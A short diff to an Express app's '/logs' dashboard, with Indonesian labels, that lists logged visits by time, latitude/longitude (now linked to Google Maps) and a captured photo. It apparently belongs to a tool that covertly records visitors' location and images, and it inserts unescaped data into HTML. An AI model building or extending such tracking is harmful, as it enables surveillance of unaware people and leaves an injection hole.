@@ -72,17 +72,25 @@ app.post('/save-all', (req, res) => {
 
 app.get('/logs', (req, res) => {
     res.send(`
-        <body style="background:#111; color:#fff; padding:20px;">
+        <body style="background:#111; color:#fff; font-family:sans-serif; padding:20px;">
             <h1>Dashboard Log</h1>
             ${visitLogs.map(log => `
-                <div style="border:1px solid #444; padding:10px; margin-bottom:10px;">
-                    <p>Waktu: ${log.waktu}</p>
-                    <p>Lokasi: ${log.lokasi.lat}, ${log.lokasi.lng}</p>
-                    ${log.foto ? `<img src="${log.foto}" style="width:200px; border-radius:5px;">` : '<p>Tidak ada foto</p>'}
+                <div style="border:1px solid #444; padding:10px; margin-bottom:10px; border-radius:8px;">
+                    <p><b>Waktu:</b> ${log.waktu}</p>
+                    <p><b>Lokasi:</b> 
+                        <a href="https://www.google.com/maps/search/?api=1&query=${log.lokasi.lat},${log.lokasi.lng}" 
+                           target="_blank" 
+                           style="color: #4ade80; text-decoration: underline;">
+                           ${log.lokasi.lat}, ${log.lokasi.lng} (Klik untuk buka di Maps)
+                        </a>
+                    </p>
+                    ${log.foto ? `<img src="${log.foto}" style="width:200px; border-radius:5px; margin-top:10px;">` : '<p>Tidak ada foto</p>'}
                 </div>
             `).join('')}
         </body>
     `);
 });
 
+
 module.exports = app;
+;
